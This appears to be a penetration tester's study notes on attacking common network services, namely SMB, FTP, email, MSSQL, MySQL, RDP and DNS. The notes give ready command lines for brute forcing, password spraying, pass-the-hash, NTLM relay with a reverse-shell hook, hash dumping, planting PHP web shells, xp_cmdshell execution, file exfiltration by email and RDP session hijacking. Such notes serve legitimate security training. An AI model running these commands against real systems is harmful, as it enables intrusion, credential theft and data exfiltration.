- Inventory and understand services in use by your target
- #FileShareServices
	- [[SMB]], [[NFS]], [[FTP]], [[TFTP]], [[SFTP]], Email, ETC
		- [[SMB]] is commonly used in Windows networks, and we will often find share folders in a Windows network. We can interact with SMB using the GUI, CLI, or tools. Let us cover some common ways of interacting with SMB using Windows & Linux.
			- **Enumeration**
				- `sudo nmap 10.129.14.128 -sV -sC -p139,445` NMAP scan
				- [[enum4linux]]
				- [[RPCclient]]
				- `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' **loggedon-users` use CME to enumerate users
				- `nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.150` use NMAP to brute users
			- **Windows**
				- [WINKEY] + [R] to open the Run dialog box 
				- Example path `\\192.168.220.129\Finance\`
				- Check for **guest** or **anonymous** access
				- `net use n: \\192.168.220.129\Finance` **map** a SMB share to a local drive `n:`
				- `net use n: \\192.168.220.129\Finance /user:plaintext Password123` **map** a SMB share with credentials
				- `dir n: /a-d /s /b | find /c ":\"` **count** files in `n:\` 
				- `dir n:\-cred- /s /b` **search** for `cred` files 
				- `findstr /s /i cred n:\-.-` **search** for `cred` files 
				- `Get-ChildItem \\192.168.220.129\Finance\`  **search** for files in **UNC** path
				- `New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"` **powershell** to **map** the `finance` share
				- `(Get-ChildItem -File -Recurse | Measure-Object).Count`  **count** how many files are in `n:\`
				- `Get-ChildItem -Recurse -Path N:\ -Include -cred- -File` **search** for `cred` files
				- `Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List` **search** files that contain `cred`
				- Script to **map** a drive with credentials  
					```powershell
					$username = 'plaintext'
					$password = 'Password123'
					$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
					$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
					New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
					```
				- **Linux**
					- **mounting** 
						- drive with creds
							```bash
							sudo mkdir /mnt/Finance
							sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
							```
						- or with a cred file
							```bash
							sudo mkdir /mnt/Finance
							mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
							```
						
						- cred file 
							```txt
							username=plaintext
							password=Password123
							domain=.
							```
						
				- `find /mnt/Finance/ -name -cred-` **find** `cred` files in SMB mount
				- `grep -rn /mnt/Finance/ -ie cred` **search** files that contain `cred`
				  
			- **General Attacks**
				- `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' **local-auth` use [[crackmapexec]] to brute force SMB
				- `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' **exec-method smbexec` run a command on target as user
				- `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` pass the hash
				- `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' **sam` grab hashes from the SAM database
				- [impacket/examples/psexec.py at master · fortra/impacket · GitHub](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
					- `impacket-psexec administrator:'Password123!'@10.10.110.17` connect to target as user
				- [impacket/examples/smbexec.py at master · fortra/impacket · GitHub](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
				- [impacket/examples/atexec.py at master · fortra/impacket · GitHub](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
				- [metasploit-framework/documentation/modules/exploit/windows/smb/psexec.md at master · rapid7/metasploit-framework · GitHub](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md)
				- [[responder]] pass the hash
					- `cat /etc/responder/Responder.conf | grep 'SMB ='` locate SMB in the responder configureation file to see its value, set to off
					- run responder
					- Use impacket or multirelay
						- `impacket-ntlmrelayx **no-http-server -smb2support -t 10.10.110.146` dump the SAM database by default
						- `impacket-ntlmrelayx **no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e {B64 encoded command}'`run a powershell command, such as a reverseshell
		-  [[FTP]]
			- `sudo nmap -sC -sV -p 21 192.168.2.142` [[05 - Personal/Jonathan/Tools/NMAP|NMAP]] **scan** of FTP
			- Anonymous logins
			- Brute force logins
				- `medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp ` use [[Medusa]] to brute force login
				- `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` use [[Hydra]] to brute force login
			- "**Bounce**" attack - An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network.
				- `nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2` **nmap** performing a **bounce** attack
		- **Email**
			- `sudo apt-get install evolution` **install** evolution email client
			- **configure** client to send and receive emails
			- **search** emails for goodies
			- [[SMTP]], [[IMAP]], [[POP3]]
			- MX - Mail Exchange Record
			- `sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128` NMAP **scan** for email services
			- `nmap -p25 -Pn --script smtp-open-relay 10.10.11.213` check for open relay
			- `host -t MX microsoft.com` **check** MX records
			- `dig mx plaintext.do | grep "MX" | grep -v ";"` get a list of MX records and trim the junk out
			- `host -t A mail1.inlanefreight.htb` **get** an A record of a mail subdomain
			- Use [[SMTP]] commands to **enumerate/hunt** access or emails on server
			- `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7` [smtp-user-enum.](https://github.com/pentestmonkey/smtp-user-enum) to **enumerate** SMTP access.  RCPT mode, user list to spray, email domain, target SMTP server
			- `python3 o365spray.py --validate --domain msplaintext.xyz` [o365spray](https://github.com/0xZDH/o365spray) **validate** if a domain exists in o365
			- `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz` [o365spray](https://github.com/0xZDH/o365spray) user account **enumeration/brute** of office365
			- `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` **password spray**
			- `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` [[Hydra]] **attack** of traditional pop3 accounts  
		- **Databases**
			- **mssql** 
				- ports tcp /1433 and udp/1434
				- `MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.   |

-
	-
		-
			-
				-  [[03 - Content/Nmap]] scan of **mssql** `nmap -Pn -sV -sC -p1433 10.10.10.125`
				- `hydra -L /path/to/usernames.txt -P /path/to/passwords.txt 192.168.1.100 mssql` password **spray** with [[Hydra]]
				- `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` using **sqsh** to connect to a **mssql** database with a **local SQL** account
				- `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` using **sqsh** to connect to a **mssql** database with a **windows** account
				- `sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30` using **sqlcmd** to connect to a **mssql** database
				- `mssqlclient.py -p 1433 julio@10.129.203.7` using impacket **mssqlclient** to connect to a **mssql** database
				- **SQL Commands**
					- List all databases
						```SQL
						SELECT name FROM master.dbo.sysdatabases
						GO
						```
					- List tables in a database
						```SQL
						USE [your_database_name];
						GO
						SELECT name
						FROM sys.tables;
						GO
						```
					- Command execution
						```SQL
						xp_cmdshell 'whoami'
						GO
						```
						- on linked server `EXEC AT [RemoteServer] ('EXEC xp_cmdshell ''dir C:\''');`
						- To **enable** `xp_cmdshell` 
							```SQL
							--To allow advanced options to be changed.  
							EXECUTE sp_configure 'show advanced options', 1
							GO
							--To update the currently configured value for advanced options.  
							RECONFIGURE
							GO  
							--To enable the feature.  
							EXECUTE sp_configure 'xp_cmdshell', 1
							GO  
							--To update the currently configured value for this feature.  
							RECONFIGURE
							GO
							```
						- On a linked server
							```SQL
							EXEC ('EXEC master.dbo.sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV];
							EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
							EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
							EXEC ('EXEC sp_configure ''show advanced options'', 1;') AT [LOCAL.TEST.LINKED.SRV];
							EXECUTE('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
							EXECUTE('xp_cmdshell "{INSERT COMMAND HERE}"') AT [LOCAL.TEST.LINKED.SRV]
							```
						- **enable** `ole automation` to allow file write, requires admin privs
						- **create** a file with `ole` 
							```SQL
							DECLARE @OLE INT
							DECLARE @FileID INT
							EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
							EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '{INSERT FILE NAME HERE}', 8, 1
							EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
							EXECUTE sp_OADestroy @FileID
							EXECUTE sp_OADestroy @OLE
							GO
							```
						- **read** local files
							```SQL
							SELECT * FROM OPENROWSET(BULK N'C:\windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
							GO
							```
							```SQL
							DECLARE @FileContents VARCHAR(MAX);
							DECLARE @OLE INT;
							DECLARE @FileID INT;
							EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
							EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\path\to\your\file.txt', 1;
							EXEC sp_OAMethod @FileID, 'ReadAll', @FileContents OUT;
							EXEC sp_OADestroy @FileID;
							EXEC sp_OADestroy @OLE;
							SELECT @FileContents AS FileContents;
							```
							```SQL
							BULK INSERT YourTable
							FROM 'C:\windows\system32\drivers\etc\hosts'
							WITH (
							    FIELDTERMINATOR = ',',
							    ROWTERMINATOR = '\n'
								);
							```
						- **steal** hashes - requires [[responder]] or [[SMBserver]] to capture hashes, further hashes can be cracked with [[john the ripper]] or [[05 - Personal/Jonathan/Tools/Auth/hashcat]]
							- **xp_dirtee**
								```SQL
								EXEC master..xp_dirtree '\\10.188.145.219\tools$'
								GO
								```
							- **xp_subdirs**
								```SQL
								EXEC master..xp_subdirs '\\10.188.145.219\tools$'
								GO
								```
					- **impersonate** a user with impersonate privs (wont work without privs)
						- **Check Which Accounts**
							```SQL
							SELECT distinct b.name
							FROM sys.server_permissions a
							INNER JOIN sys.server_principals b
							ON a.grantor_principal_id = b.principal_id
							WHERE a.permission_name = 'IMPERSONATE'
							GO
							```
						- **Verify** current user, 0 means do not have priv of role checked
							```SQL
							SELECT SYSTEM_USER
							SELECT IS_SRVROLEMEMBER('sysadmin')
							go
							```
						- **Impersonate** SA	
							```SQL
							EXECUTE AS LOGIN = '{USERNAME}'
							SELECT SYSTEM_USER
							SELECT IS_SRVROLEMEMBER('sysadmin')
							GO
							```
					- **check** remote server access, 1 means remote and 0 means linked
						```SQL
						SELECT srvname, isremote FROM sysservers
						GO
						```
					- **check** what user is connecting to linked server 
						```SQL
						EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LINKED SERVER]
						GO
						```
					- **SQL Email**
						- See if files can be emailed from the system to an attacker
							  ```SQL
							--EXEC msdb.dbo.sysmail_help_status_sp
							--EXEC sysmail_help_profile_sp
							EXEC msdb.dbo.sp_send_dbmail
							@recipients = '{EMAIL}',
							@subject = 'Test Email',
							@body = 'This is a test email sent from SQL Server.',
							@body_format = 'HTML',  -- You can use 'TEXT' for plain text emails
							@file_attachments='C:\windows\system32\drivers\etc\hosts';
							```
					- `MSSQL` default system schemas/databases:
						- `master` keeps the information for an instance of SQL Server.
						- `msdb` used by SQL Server Agent.
						- `model` a template database copied for each new database.
						- `resource` a read-only database that keeps system objects visible in every database on the server in sys schema.
						- `tempdb` - keeps temporary objects for SQL queries.
				- **mysql**
					- **CMD**
						- `sqsh -S 10.129.20.13 -U username -P Password123` **connect** to a mysql database with **linux** tool `sqsh` 
						- `mysql -u username -pPassword123 -h 10.129.20.13` **connect** to a mysql database with **linux** tool `mysql` 
						- `sqlcmd -S 10.129.20.13 -U username -P Password123` **connect** to a mysql database with **windows** tool `sqlcmd` 
						- `mysql -u username -pPassword123 -h 10.129.20.13` **connect** to a mysql database with **windows** tool `mysql`
						- `SHOW DATABASES;` **list** all databases
						- `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';` **write** local files
							- `show variables like "secure_file_priv";` **check** `file` level privs to **write** local files, if empty files can be written
						- `select LOAD_FILE("/etc/passwd");` **read** local files
					- **GUI**
						- `sudo dpkg -i dbeaver-<version>.deb` **install linux** tool `dbeaver`
						- `dbeaver &` **run** `debeaver`
						- **configure** `dbeaver` to connect to database
					- `MySQL` default system schemas/databases:		
						- `mysql` - is the system database that contains tables that store information required by the MySQL server
						- `information_schema` - provides access to database metadata
						- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
						- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
		- **RPC**
			- [[RPCclient]]
		- Dropbox, Google Drive, Onedrive, Sharepoint, AWS S3, Azure Blob Storage, Google Cloud Storage, etc
		- **RDP**
			- TCP/3389 by default
			- `nmap -Pn -p3389 192.168.2.143` nmap scan of RDP
			- `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` password **spray** with [[crowbar]]
			- `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` password **spray** with [[Hydra]]
			- `rdesktop -u admin -p password123 192.168.2.143` **connect** to RDP session
			- `query user` get a list of active users
			- `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` **hijack** a users system, must have system level access
			- `sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"` **Create** a service call **sessionhijack** to hijack rdp session 13
				- `net start sessionhijack` run the service **sessionhijack** 
				- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` **remove** restricted admin reg key
				- `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9` **connect** to target using a known hash
			- `search rdp_scanner` a metasploit aux for hunting RDP
		- **DNS**
			- Typically TCP + UDP port 53
			- `nmap -p53 -Pn -sV -sC 10.10.110.213` nmap scan of DNS
			- `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` attempt **zone transfer**
			- `fierce --domain zonetransfer.me` use [fierce](https://github.com/mschwager/fierce) to **enumerate** DNS
			- Domain **take over** is when a non existing domain is registered by the attacker
			- Sub-domain **take over** is when an attacker creates a sub domain of a legit domain and uses CNAME records to direct traffic to the attacker
			- `./subfinder -d inlanefreight.com -v` use subfinder to **enumerate** sub domains
			- `./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt` use subbrute to **enumerate** sub domains, names is a custom list of subdomains and resolvers.txt is a custom list of name servers
			- `host support.inlanefreight.com` **list** DNS records
			- DNS cache **poisoning** with ettercap/bettercap
				- `nano /etc/ettercap/etter.dns` configure ettercap to use A record of domain to spoof
					- In better cap use `Hosts > Scan for Hosts` to scan network for targets
					- Activate DNS spoofing using `Plugins > Manage Plugins` select `dns_spoof`
		- **Email**

| **Port**  | **Service**                                                                |
| --------- | -------------------------------------------------------------------------- |
| `TCP/25`  | SMTP Unencrypted                                                           |
| `TCP/143` | IMAP4 Unencrypted                                                          |
| `TCP/110` | POP3 Unencrypted                                                           |
| `TCP/465` | SMTP Encrypted                                                             |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 Encrypted                                                            |
| `TCP/995` | POP3 Encrypted                                                             |

#### Tools to Interact with Common Services

| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                | **RDP**                                                   | **DNS**                                                                  |
| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------- | ------------------------------------------------------------------------ |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              | [crowbar](https://github.com/galkan/crowbar)              | [Sublist3r](https://github.com/aboul3la/Sublist3r)                       |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      | [rdesktop](https://github.com/rdesktop/rdesktop/releases) | [DNSDumpster.com](https://dnsdumpster.com/)                              |
| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             | [FreeRDP](https://github.com/FreeRDP/FreeRDP)             | [subfinder](https://github.com/projectdiscovery/subfinder)               |
| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com/)           | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                | [Remmina](https://gitlab.com/Remmina/Remmina)             | [fierce](https://github.com/mschwager/fierce)                            |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |                                                           | [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) |
| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |                                                           | [Ettercap](https://www.ettercap-project.org/)                            |
|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |                                                           | [bettercap](https://www.bettercap.org/)                                  |
|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |                                                           | [[nslookup]]                                                             |
|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |                                                           |                                                                          |
|                                                                                          |                                             | [MxToolbox](https://mxtoolbox.com/)                |                                                                                                                              |                                                           |                                                                          |

Some reasons why we may not have access to a resource:
- Authentication
- Privileges
- Network Connection
- Firewall Rules
- Protocol Support

![[Pasted image 20240920095122.png]]

We can generalize `Source` as a source of information used for the specific task of a process. There are many different ways to pass information to a process. The graphic shows some of the most common examples of how information is passed to the processes.

| **Information Source** | **Description**                                                                                                                                                                                    |
| - | --- |
| `Code`                 | This means that the already executed program code results are used as a source of information. These can come from different functions of a program.                                               |
| `Libraries`            | A library is a collection of program resources, including configuration data, documentation, help data, message templates, prebuilt code and subroutines, classes, values, or type specifications. |
| `Config`               | Configurations are usually static or prescribed values that determine how the process processes information.                                                                                       |
| `APIs`                 | The application programming interface (API) is mainly used as the interface of programs for retrieving or providing information.                                                                   |
| `User Input`           | If a program has a function that allows the user to enter specific values used to process the information accordingly, this is the manual entry of information by a person.                        |
The `Process` is about processing the information forwarded from the source.

| **Process Components** | **Description**                                                                                                                                                            |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `PID`                  | The Process-ID (PID) identifies the process being started or is already running. Running processes have already assigned privileges, and new ones are started accordingly. |
| `Input`                | This refers to the input of information that could be assigned by a user or as a result of a programmed function.                                                          |
| `Data processing`      | The hard-coded functions of a program dictate how the information received is processed.                                                                                   |
| `Variables`            | The variables are used as placeholders for information that different functions can further process during the task.                                                       |
| `Logging`              | During logging, certain events are documented and, in most cases, stored in a register or a file. This means that certain information remains in the system.               |
|                        |                                                                                                                                                                            |
`Privileges` are present in any system that controls processes.

|**Privileges**|**Description**|
|-|-|
|`System`|These privileges are the highest privileges that can be obtained, which allow any system modification. In Windows, this type of privilege is called `SYSTEM`, and in Linux, it is called `root`.|
|`User`|User privileges are permissions that have been assigned to a specific user. For security reasons, separate users are often set up for particular services during the installation of Linux distributions.|
|`Groups`|Groups are a categorization of at least one user who has certain permissions to perform specific actions.|
|`Policies`|Policies determine the execution of application-specific commands, which can also apply to individual or grouped users and their actions.|
|`Rules`|Rules are the permissions to perform actions handled from within the applications themselves.|
`Destination`

|**Destination**|**Description**|
|-|-|
|`Local`|The local area is the system's environment in which the process occurred. Therefore, the results and outcomes of a task are either processed further by a process that includes changes to data sets or storage of the data.|
|`Network`|The network area is mainly a matter of forwarding the results of a process to a remote interface. This can be an IP address and its services or even entire networks. The results of such processes can also influence the route under certain circumstances.|
### **Log4j**  
- JNDI attack based on the `Concept of Attacks`.
#### Initiation of the Attack

|**Step**|**Log4j**|**Concept of Attacks - Category**|
|-|-|-|
|`1.`|The attacker manipulates the user agent with a JNDI lookup command.|`Source`|
|`2.`|The process misinterprets the assigned user agent, leading to the execution of the command.|`Process`|
|`3.`|The JNDI lookup command is executed with administrator privileges due to logging permissions.|`Privileges`|
|`4.`|This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker.|`Destination`|
#### Trigger Remote Code Execution

|**Step**|**Log4j**|**Concept of Attacks - Category**|
|-|-|-|
|`5.`|After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process.|`Source`|
|`6.`|Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.|`Process`|
|`7.`|The malicious code is executed with administrator privileges due to logging permissions.|`Privileges`|
|`8.`|The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.|`Destination`|



# Service Misconfigurations
- ## Authentication
	- password reuse
	- default passwords
	- easy cracked passwords
	- No authentication
- ## Authorization
	- Unnecessary Defaults
		- Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
		- Default accounts and their passwords are still enabled and unchanged.
		- Error handling reveals stack traces or other overly informative error messages to users.
		- For upgraded systems, the latest security features are disabled or not configured securely.
		- Admin interfaces should be disabled.
		- Debugging is turned off.
		- Disable the use of default usernames and passwords.
		- Set up the server to prevent unauthorized access, directory listing, and other issues.
		- Run scans and audits regularly to help discover future misconfigurations or missing fixes.
	- Accidental over privileged



